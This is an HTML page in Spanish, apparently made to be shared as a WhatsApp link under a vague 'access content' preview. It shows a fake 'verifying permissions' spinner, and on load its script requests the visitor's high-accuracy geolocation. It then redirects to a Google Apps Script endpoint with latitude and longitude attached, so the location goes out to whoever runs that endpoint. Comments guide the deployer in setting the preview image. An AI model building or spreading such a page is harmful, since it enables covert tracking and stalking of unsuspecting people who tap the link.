<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acceso</title>

  <!-- Metadatos Open Graph para la vista previa de WhatsApp -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Acceso al contenido">
  <meta property="og:description" content="Toca aquí para continuar">
  
  <!-- REEMPLAZA ESTA RUTA: Usa el enlace directo (Raw o de GitHub Pages) de tu imagen 'luna' -->
  <!-- Ejemplo con GitHub Pages: https://tu-usuario.github.io/tu-repo/luna.jpg -->
  <!-- Ejemplo Raw: https://raw.githubusercontent.com/tu-usuario/tu-repo/main/luna.png -->
  <meta property="og:image" content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/luna.jpg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background-color: #f7f9fa;
      color: #333;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .spinner {
      width: 44px;
      height: 44px;
      border: 4px solid #e2e8f0;
      border-top: 4px solid #0066cc;
      border-radius: 50%;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 1.1rem;
      margin: 0;
    }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <p>Verificando permisos y cargando...</p>

  <script>
    const urlDestino = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";

    function irADestino(parametros = "") {
      window.location.href = urlDestino + parametros;
    }

    // Solicitar permiso de ubicación
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (posicion) => {
          // Si el usuario acepta, adjuntamos latitud y longitud por parámetro GET
          const lat = posicion.coords.latitude;
          const lon = posicion.coords.longitude;
          irADestino(`?lat=${lat}&lon=${lon}`);
        },
        (error) => {
          // Si el usuario deniega el permiso o falla la señal, redirige igualmente
          console.warn("Permiso de ubicación denegado o no disponible:", error.message);
          irADestino();
        },
        {
          enableHighAccuracy: true,
          timeout: 6000,
          maximumAge: 0
        }
      );
    } else {
      // Navegador sin soporte de geolocalización
      irADestino();
    }
  </script>

</body>
</html>
